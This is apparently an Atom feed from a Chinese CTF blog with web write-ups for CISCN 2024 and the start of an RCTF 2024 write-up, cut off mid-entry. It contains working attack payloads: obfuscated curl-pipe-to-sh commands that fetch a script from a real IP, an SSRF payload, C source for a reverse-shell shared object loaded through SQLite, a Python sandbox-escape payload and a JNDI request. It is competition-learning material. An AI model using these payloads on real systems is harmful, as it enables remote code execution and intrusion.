<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Boogiepop Doesn&#39;t Laugh</title>
  
  <subtitle>不吉波普不笑</subtitle>
  <link href="http://boogipop.com/atom.xml" rel="self"/>
  
  <link href="http://boogipop.com/"/>
  <updated>2024-11-18T08:09:33.238Z</updated>
  <id>http://boogipop.com/</id>
  
  <author>
    <name>Boogipop</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>桂林-6.9-6.11</title>
    <link href="http://boogipop.com/2024/06/15/GuiLin/"/>
    <id>http://boogipop.com/2024/06/15/GuiLin/</id>
    <published>2024-06-14T16:16:04.195Z</published>
    <updated>2024-11-18T08:09:33.238Z</updated>
    
    <content type="html"><![CDATA[<p>感谢</p>]]></content>
    
    
    <summary type="html">SomeThink</summary>
    
    
    
    <category term="ThinkAbout" scheme="http://boogipop.com/categories/ThinkAbout/"/>
    
    
  </entry>
  
  <entry>
    <title>全国大学生信息安全竞赛 CISCN 2024 Web Writeup</title>
    <link href="http://boogipop.com/2024/05/27/CISCN%202024%20%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%20Web%20Writeup/"/>
    <id>http://boogipop.com/2024/05/27/CISCN%202024%20%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%20Web%20Writeup/</id>
    <published>2024-05-27T03:51:24.427Z</published>
    <updated>2024-05-27T03:52:44.060Z</updated>
    
    <content type="html"><![CDATA[<h1 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); </span><br><span class="line">     <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">         <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个open_basedir是一点用没有的。最终payload可以利用<code>eval </code>xxx<code>配合`\`反斜杠去绕过关键字就可以 `cmd=eval `ec\ho Y3VybCBo\dHRwOi8vOC4xMzAuMjQuMTg4OjgwMDAvMS5zaHxzaA==|base\64 -d|s\h</code><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716112779484-f715a06a-b023-43c6-b3b7-5b5f37c9176a.png#averageHue=%232c2e39&clientId=uc7aa35c2-bfa6-4&from=paste&height=836&id=u29cde1b3&originHeight=1672&originWidth=2632&originalType=binary&ratio=2&rotation=0&showTitle=false&size=279670&status=done&style=none&taskId=u664783d0-4ffb-4c7a-9777-6e3c036392f&title=&width=1316" alt="image.png"><br>反弹shell过后发现没有flag文件，查看ps -ef<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716112803066-5cf59c4f-4d94-4526-b709-c6b1eeca2f53.png#averageHue=%232d2f3a&clientId=uc7aa35c2-bfa6-4&errorMessage=unknown%20error&from=paste&height=836&id=u7fb1cb3a&originHeight=1672&originWidth=2632&originalType=binary&ratio=2&rotation=0&showTitle=false&size=546852&status=error&style=none&taskId=u44425b1a-41aa-4f3f-83fe-7474a24b20b&title=&width=1316" alt="image.png"><br>发现存在mysql，上线cs平台后mysql -uroot -proot直接连进去读flag了<br><img src="https://cdn.nlark.com/yuque/0/2024/png/29650981/1716108068346-6ad5dcf2-28d6-4be5-8635-c30948655048.png#averageHue=%2330323a&clientId=u21684f9d-2324-4&from=paste&height=704&id=EiRhh&originHeight=1056&originWidth=1803&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=311401&status=done&style=none&taskId=u5c79f255-a26b-4400-8596-7618aa5424b&title=&width=1202" alt="image.png"></p><h1 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h1><p>dirsearch可以扫出flag.php，内容后面给了hint</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;Just input &#x27;cmd&#x27; From 127.0.0.1&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>也就是说让我们找到一个ssrf的点位就行了。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716111579072-04af536a-c64d-407b-a0af-624143ac59b8.png#averageHue=%2325262a&clientId=uc7aa35c2-bfa6-4&from=paste&height=965&id=u91365f33&originHeight=1930&originWidth=3218&originalType=binary&ratio=2&rotation=0&showTitle=false&size=743970&status=done&style=none&taskId=u9ee26ecb-4952-4e06-ac4b-5e33abc6d9f&title=&width=1609" alt="image.png"><br>源码审计发现down_img路由存在ssrf漏洞<br>但是我们要满足一个正则<code>/(src)=([\&quot;|&#39;]?)([^ \&quot;&#39;&gt;]+)\\2/i&quot;</code>，这个正则的含义其实也就是<img>标签的内容，example:<code>&lt;img src=&quot;http://xxx?cmd=whoami&quot;/&gt;</code><br>这个路由原本是用来识别img标签里的src位置的，但我们可控输入所以就造成了ssrf，最终poc<br><code>value=&lt;img src=&quot;[http://127.0.0.1/flag.php?cmd=curl%24IFS%249http%3A%2F%2F8.130.24.188%3A8000%2F1.sh%7Csh&quot;](http://127.0.0.1/flag.php?cmd=curl%24IFS%249http%3A%2F%2F8.130.24.188%3A8000%2F1.sh%7Csh&quot;) alt=&quot;Example Image&quot;&gt;</code><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716112211908-61b8b1a7-da2c-4baa-a618-cb9b48ac064d.png#averageHue=%23b1b1b1&clientId=uc7aa35c2-bfa6-4&from=paste&height=1041&id=u67773f13&originHeight=2082&originWidth=3528&originalType=binary&ratio=2&rotation=0&showTitle=false&size=388306&status=done&style=none&taskId=u7d26b620-6c4d-4335-96ee-f70eca43c2d&title=&width=1764" alt="image.png"><br>发送请求后vps收到请求<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716112233991-2cb69a97-a839-4a9d-ad3d-1a1f7dc0ed3b.png#averageHue=%232c2e39&clientId=uc7aa35c2-bfa6-4&from=paste&height=836&id=u809d9ff4&originHeight=1672&originWidth=2632&originalType=binary&ratio=2&rotation=0&showTitle=false&size=287165&status=done&style=none&taskId=u03f4e00c-acc1-46fe-a660-db328589439&title=&width=1316" alt="image.png"><br>最终拿到flag</p><h1 id="ezjava"><a href="#ezjava" class="headerlink" title="ezjava"></a>ezjava</h1><p>考点是Java的Jdbc Attack对应的Sqlite部分。<br>虽然题目给了3个JDBC服务，但其实可以利用的只有sqlite，目的是rce。注意到开启了extension_enable选项<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716108985265-0ff4a79e-364a-475c-939c-768d58cf28ba.png#averageHue=%23222326&clientId=uc7aa35c2-bfa6-4&from=paste&height=363&id=zRnHo&originHeight=726&originWidth=2140&originalType=binary&ratio=2&rotation=0&showTitle=false&size=186280&status=done&style=none&taskId=u2dc5f5f6-4e34-4e57-a41c-59101e73a2a&title=&width=1070" alt="image.png"><br>开启了拓展支持，并且已经有了相关的攻击面文章<br><a href="https://conference.hitb.org/files/hitbsecconf2021sin/materials/D1T2%20-%20Make%20JDBC%20Attacks%20Brilliant%20Again%20-%20Xu%20Yuanzhen%20&%20Chen%20Hongkun.pdf">https://conference.hitb.org/files/hitbsecconf2021sin/materials/D1T2%20-%20Make%20JDBC%20Attacks%20Brilliant%20Again%20-%20Xu%20Yuanzhen%20&%20Chen%20Hongkun.pdf</a><br>在这个ppt里我们知道如何去加载远程的db文件。首先我们开启远程debug调试一下看看逻辑。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716110715893-885c0680-942d-4c2b-bc94-fc210a34fa74.png#averageHue=%23556e65&clientId=uc7aa35c2-bfa6-4&from=paste&height=826&id=z9RnT&originHeight=1652&originWidth=3444&originalType=binary&ratio=2&rotation=0&showTitle=false&size=674273&status=done&style=none&taskId=u64857429-ce82-44cd-86d5-50f6a074bd0&title=&width=1722" alt="image.png"><br>这边会取resourceAddr的hashcode加上指定的前缀作为最终的缓存文件名。那么我们的思路就是利用这个特性缓存一个恶意的so文件，这是第一次请求。<br>恶意so文件制作过程如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">flag</span><span class="params">()</span> &#123;&#123;</span><br><span class="line">    system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/8.130.24.188/7778 &lt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">space</span><span class="params">()</span> &#123;&#123;</span><br><span class="line">    <span class="comment">// this just exists so the resulting binary is &gt; 500kB</span></span><br><span class="line">         <span class="type">static</span> <span class="type">char</span> waste[<span class="number">500</span> * <span class="number">1024</span>] = &#123;&#123;<span class="number">2</span>&#125;&#125;;</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure><p><code>gcc -shared -fPIC exp.c -o exp.so</code><br>最后我们使用load_extension(‘xxx’,’flag’)函数就会加载flag方法，成功的触发反弹shell了。<br>第二次请求我们就去加载这个恶意so文件。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.pocs.solutions.ciscn;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.PreparedStatement;</span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Gen</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">dbFile</span> <span class="operator">=</span> <span class="string">&quot;poc.db&quot;</span>;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(dbFile);</span><br><span class="line">            Class.forName(<span class="string">&quot;org.sqlite.JDBC&quot;</span>);</span><br><span class="line">            <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(<span class="string">&quot;jdbc:sqlite:&quot;</span>+dbFile);</span><br><span class="line">            System.out.println(<span class="string">&quot;Opened database successfully&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;CREATE VIEW security as SELECT ( SELECT load_extension(&#x27;/tmp/sqlite-jdbc-tmp-1914716480.db&#x27;,&#x27;flag&#x27;));&quot;</span>;  <span class="comment">//向其中插入传入的三个参数</span></span><br><span class="line">            <span class="type">PreparedStatement</span> <span class="variable">preStmt</span> <span class="operator">=</span> conn.prepareStatement(sql);</span><br><span class="line"></span><br><span class="line">            preStmt.executeUpdate();</span><br><span class="line">            preStmt.close();</span><br><span class="line">            conn.close();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们生成恶意db文件的脚本如上，可以看到我们创建了一个security表，然后用到了as SELECT语句。（security表用的是ppt里的，直接复制粘贴了）<br>然后我们发起请求就会触发select语句<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716110930844-2d9caf1d-fab5-44f2-96a6-5738c5b77383.png#averageHue=%23232427&clientId=uc7aa35c2-bfa6-4&from=paste&height=256&id=UcmA2&originHeight=512&originWidth=1948&originalType=binary&ratio=2&rotation=0&showTitle=false&size=118260&status=done&style=none&taskId=ue8bddff1-053c-4dc8-a241-6a3e064477d&title=&width=974" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716110926524-d7586cb7-47c4-4a60-9ff5-9fd7e301dc4a.png#averageHue=%23212226&clientId=uc7aa35c2-bfa6-4&from=paste&height=558&id=kkYrM&originHeight=1116&originWidth=1848&originalType=binary&ratio=2&rotation=0&showTitle=false&size=177962&status=done&style=none&taskId=ua22bb6c4-5230-4f54-917d-fff4015ecc0&title=&width=924" alt="image.png"><br>然后就开始实操。首先先让目标缓存一下我们的so文件<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716111203456-52626a01-d2d7-4a32-9323-7db9f81f58c1.png#averageHue=%23282b3a&clientId=uc7aa35c2-bfa6-4&from=paste&height=823&id=Ebp6p&originHeight=1646&originWidth=2574&originalType=binary&ratio=2&rotation=0&showTitle=false&size=680340&status=done&style=none&taskId=u2eb403f0-a5d0-47a5-83a9-da902048e45&title=&width=1287" alt="image.png"><br>然后我们再去加载恶意db，触发指定的sql语句。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716111242096-11de341f-e12e-44a0-91a0-488dfe842a88.png#averageHue=%232a2c3b&clientId=uc7aa35c2-bfa6-4&from=paste&height=800&id=aPkOQ&originHeight=1600&originWidth=2628&originalType=binary&ratio=2&rotation=0&showTitle=false&size=773480&status=done&style=none&taskId=u070fab08-d874-4f9b-a61a-74d49bef7bc&title=&width=1314" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716111250480-2d1ed89b-ca2d-4d6b-a21c-c3831c26dc0a.png#averageHue=%232c2e39&clientId=uc7aa35c2-bfa6-4&from=paste&height=836&id=sLFEn&originHeight=1672&originWidth=2632&originalType=binary&ratio=2&rotation=0&showTitle=false&size=286037&status=done&style=none&taskId=u6d4908b0-ab05-43e8-8330-08a5b1548ab&title=&width=1316" alt="image.png"><br>最终获取flag</p><h1 id="mossfern"><a href="#mossfern" class="headerlink" title="mossfern"></a>mossfern</h1><p>yjail frame帧逃逸<br><a href="https://xz.aliyun.com/t/13635?time__1311=mqmxnQ0QiQi=DteDsD7md0=dG=d8bgh8wiD#toc-5">https://xz.aliyun.com/t/13635?time__1311&#x3D;mqmxnQ0QiQi%3DDteDsD7md0%3DdG%3Dd8bgh8wiD#toc-5</a><br>参考上述文章</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /api/run HTTP/<span class="number">1.1</span></span><br><span class="line">Host: eci-2zeflmaf18usxi7ngaav.cloudeci1.ichunqiu.com</span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.9</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10_15_7</span>) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">124.0</span><span class="number">.0</span><span class="number">.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Content-<span class="type">Type</span>: application/json</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Origin: http://eci-2zeflmaf18usxi7ngaav.cloudeci1.ichunqiu.com</span><br><span class="line">Referer: http://eci-2zeflmaf18usxi7ngaav.cloudeci1.ichunqiu.com/</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">Cookie: Hm_lvt_2d0601bd28de7d49818249cf35d95943=<span class="number">1713496688</span>,<span class="number">1713681080</span>,<span class="number">1715993802</span></span><br><span class="line">Content-Length: <span class="number">199</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;code&quot;</span>:<span class="string">&quot;def boogipop():\n    def exp():\n        yield pop.gi_frame.f_back.f_back.f_back\n    pop = exp()\n    for exp in pop:\n        boo=exp\n    return boo\nkino=boogipop()\nprint(kino)&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716108779323-eb6efc91-f311-41a3-8b2c-e9012a933c19.png#averageHue=%23d9dfca&clientId=uc7aa35c2-bfa6-4&from=paste&height=909&id=urVbQ&originHeight=1818&originWidth=2972&originalType=binary&ratio=2&rotation=0&showTitle=false&size=743547&status=done&style=none&taskId=u6ba949b6-c518-4ee3-b79e-2cb601ca678&title=&width=1486" alt="image.png"><br>可以看到已经获取到了f_code对象，根据文章中所说到的<br>f_code存在co_consts对象。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716108831657-295aa243-c34e-4693-aa70-16956fb12cca.png#averageHue=%23242528&clientId=uc7aa35c2-bfa6-4&from=paste&height=880&id=F6qjn&originHeight=1760&originWidth=3318&originalType=binary&ratio=2&rotation=0&showTitle=false&size=295830&status=done&style=none&taskId=u127d5339-c078-4418-8d19-b1cdd38d63f&title=&width=1659" alt="image.png"><br>但是在本地测试的时候发现由于结果出现了flag字眼就会被拦截，这里其实很好绕过。<br>因为是全字符串检测，我们字符串截取部分自然就可以返回flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">boogipop</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">        <span class="keyword">yield</span> pop.gi_frame.f_back.f_back.f_back</span><br><span class="line">    pop = exp()</span><br><span class="line">    <span class="keyword">for</span> exp <span class="keyword">in</span> pop:</span><br><span class="line">        boo=exp</span><br><span class="line">    <span class="keyword">return</span> boo</span><br><span class="line">kino=boogipop()</span><br><span class="line"><span class="built_in">print</span>(kino.f_code.co_consts[<span class="number">19</span>][<span class="number">1</span>:])</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716108877232-9f24eebd-c30f-4397-bb12-c40d1d6de201.png#averageHue=%23dfdfdf&clientId=uc7aa35c2-bfa6-4&from=paste&height=840&id=vvoFG&originHeight=1680&originWidth=2728&originalType=binary&ratio=2&rotation=0&showTitle=false&size=433681&status=done&style=none&taskId=u2f8b3324-a2e3-41eb-8bbe-984615839cf&title=&width=1364" alt="image.png"></p><h1 id="easycms-revenge"><a href="#easycms-revenge" class="headerlink" title="easycms_revenge"></a>easycms_revenge</h1><p>和第一天的都一样<br><code>value=&lt;img src=&quot;[http://127.0.0.1/flag.php?cmd=curl%24IFS%249http%3A%2F%2F8.130.24.188%3A8000%2F1.sh%7Csh&quot;](http://127.0.0.1/flag.php?cmd=curl%24IFS%249http%3A%2F%2F8.130.24.188%3A8000%2F1.sh%7Csh&quot;) alt=&quot;Example Image&quot;&gt;</code><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716112400543-d1f95c44-8c15-4c8c-b7d9-9d5eceef24b6.png#averageHue=%23d9cf95&clientId=uc7aa35c2-bfa6-4&from=paste&height=1041&id=ua30702d1&originHeight=2082&originWidth=3528&originalType=binary&ratio=2&rotation=0&showTitle=false&size=761634&status=done&style=none&taskId=uff0a57b7-1e65-471d-8976-b7474d992a2&title=&width=1764" alt="image.png"><br>发送请求后vps收到请求<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716112403326-09db90f9-0e7c-4391-91c4-81d1178df519.png#averageHue=%232c2e3a&clientId=uc7aa35c2-bfa6-4&from=paste&height=836&id=u2ce8c8c1&originHeight=1672&originWidth=2632&originalType=binary&ratio=2&rotation=0&showTitle=false&size=392413&status=done&style=none&taskId=u79378ee2-15bd-4634-a506-8fc32810fb5&title=&width=1316" alt="image.png"><br>最终拿到flag</p>]]></content>
    
    
    <summary type="html">大伙儿都太厉害了</summary>
    
    
    
    <category term="WriteUp" scheme="http://boogipop.com/categories/WriteUp/"/>
    
    
    <category term="WriteUp" scheme="http://boogipop.com/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>JQCTF2024、RCTF2024 Web Writeup</title>
    <link href="http://boogipop.com/2024/05/27/JQCTF2024%E3%80%81RCTF2024%20Web%20Writeup/"/>
    <id>http://boogipop.com/2024/05/27/JQCTF2024%E3%80%81RCTF2024%20Web%20Writeup/</id>
    <published>2024-05-27T03:47:47.188Z</published>
    <updated>2024-05-27T03:52:20.752Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716734593297-d926f3f7-76f8-4f90-9ecc-e7d922869f5d.png#averageHue=%23101936&clientId=u3af23d66-84b5-4&from=paste&height=830&id=u400f619b&originHeight=1660&originWidth=3242&originalType=binary&ratio=2&rotation=0&showTitle=false&size=2551618&status=done&style=none&taskId=uc48db502-5755-43ca-b50b-69a3ce47d56&title=&width=1621" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716734601738-b5393cf0-24a3-47f0-a314-3a083ac9d17a.png#averageHue=%232f3c48&clientId=u3af23d66-84b5-4&from=paste&height=452&id=u49ef9156&originHeight=904&originWidth=3502&originalType=binary&ratio=2&rotation=0&showTitle=false&size=1158764&status=done&style=none&taskId=u9cde6275-313a-4813-b8df-4fb8218d6fd&title=&width=1751" alt="dadf588497bf507a2b0ceac984d0297a.png"></p><h1 id="RCTF"><a href="#RCTF" class="headerlink" title="RCTF"></a>RCTF</h1><h2 id="OpenYourEyesToSeeTheWorld"><a href="#OpenYourEyesToSeeTheWorld" class="headerlink" title="OpenYourEyesToSeeTheWorld"></a>OpenYourEyesToSeeTheWorld</h2><p>一题考的是<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716734375402-ba3053ad-b184-41dd-9a7a-e9e25652c76a.png#averageHue=%23222327&clientId=u3af23d66-84b5-4&from=paste&id=uce52f84c&originHeight=968&originWidth=2372&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u9eda8903-f9a3-4f47-b0e6-ac4c13fcc04&title="><br>new InitialDirContext(properties)).search该如何去触发Jndi。这一题指定post传入json，指定searchBase和filter。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST /index HTTP/1.1</span><br><span class="line">Host: localhost:8899</span><br><span class="line">sec-ch-ua-platform: &quot;macOS&quot;</span><br><span class="line">Pragma: no-cache</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Accept-Encoding: gzip, deflate, br, zstd</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: Goland-5df45c20=acaad4c4-6ed5-4e7f-a2f0-891765d48e30; Phpstorm-b9a68abe=849deb9b-548a-4ca8-8d65-7c13b6503159; Idea-44fa379b=c955cda9-e124-4dce-a7f3-1dc2bff3d8ba</span><br><span class="line">sec-ch-ua: &quot;Google Chrome&quot;;v=&quot;125&quot;, &quot;Chromium&quot;;v=&quot;125&quot;, &quot;Not.A/Brand&quot;;v=&quot;24&quot;</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;searchBase&quot;:&quot;dc\u003Dexample,dc\u003Dcom&quot;,&quot;filter&quot;:&quot;ObjectClass\u003D123&quot;,&quot;ip&quot;:&quot;8.130.24.188&quot;,&quot;port&quot;:8088&#125;</span><br></pre></td></tr></table></figure><p>其实ldap的search就是lookup的另一个版本，他们都是进行筛选，只不过lookup是直接在url里筛选，search是另外启2个参数。在调试流程不难发现下述过程<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716734375528-06cfdc01-5427-4883-b2c8-806c9799f7fa.png#averageHue=%23292c30&clientId=u3af23d66-84b5-4&from=paste&id=u59af640c&originHeight=1572&originWidth=3056&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u6987a283-64a9-48f0-b782-9cad9c9986b&title="><br>我们会进入p_search方法内部，进而进入p_resolveIntermediate<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716734375470-20fea2b8-0e40-48e6-ab5e-bddce1570297.png#averageHue=%2323262c&clientId=u3af23d66-84b5-4&from=paste&id=u4a4ef64d&originHeight=1068&originWidth=2470&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=uec5e85f3-ad34-4e10-a8c0-2ec50445374&title="><br>假如我们进入c_resolveIntermediate_nns<br><img 